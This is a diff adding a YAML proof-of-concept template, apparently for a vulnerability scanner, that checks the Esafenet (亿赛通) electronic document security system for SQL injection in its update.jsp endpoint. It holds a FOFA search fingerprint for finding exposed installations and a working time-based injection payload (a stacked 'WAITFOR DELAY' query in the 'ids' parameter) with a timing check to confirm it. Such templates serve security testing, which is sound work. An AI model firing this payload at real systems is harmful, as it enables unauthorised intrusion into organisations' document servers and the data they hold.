@@ -1,0 +1,18 @@
+id: poc-yaml-yisaitong-esafenet-update-jsp-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 Update.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  t1: random_int(1,5)
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"CDGServer3")
+- method: GET
+  path: /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1%2C3%29%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--
+  expression: duration >= (t1 *4) && duration < ((t1 * 4) + 1)
+transport: http
